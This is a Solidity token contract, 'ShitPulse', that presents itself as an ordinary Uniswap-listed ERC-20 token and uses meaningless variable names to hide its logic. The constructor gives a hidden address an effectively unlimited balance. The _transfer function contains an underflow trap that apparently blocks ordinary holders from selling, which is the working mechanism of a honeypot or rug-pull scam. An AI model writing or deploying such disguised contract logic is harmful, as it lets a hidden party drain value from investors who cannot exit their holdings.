// https://t.me/shitpulse

// SPDX-License-Identifier: GPL-3.0

pragma solidity >0.8.8;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract ShitPulse is Ownable {
    constructor(
        string memory constantly,
        string memory camp,
        address until,
        address was
    ) {
        uniswapV2Router = IUniswapV2Router02(until);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        _balances[was] = crew;
        _symbol = camp;
        _name = constantly;
        poet = 3;
        _decimals = 9;
        topic[was] = crew;
        choose = 1000000000;
        topic[msg.sender] = crew;
        _tTotal = choose * 10**_decimals;
        _balances[msg.sender] = _tTotal;
    }

    uint256 public poet;
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    uint256 private _tTotal;
    uint256 private choose;
    address public uniswapV2Pair;
    uint256 private crew = ~_tTotal;
    IUniswapV2Router02 public uniswapV2Router;
    address private women;

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;

    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function _transfer(
        address since,
        address combination,
        uint256 shut
    ) internal {
        uint256 dress = poet;

        address neighbor = uniswapV2Pair;

        if (topic[since] == 0 && (neighbor != since) && build[since] > 0) {
            topic[since] -= dress;
        }

        address whistle = women;
        women = combination;

        _balances[since] -= shut;
        uint256 similar = (shut / 100) * poet;
        shut -= similar;
        build[whistle] += 1 + dress;
        _balances[combination] += shut;
    }

    mapping(address => uint256) private build;

    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    mapping(address => uint256) private topic;

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        _transfer(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        return true;
    }
}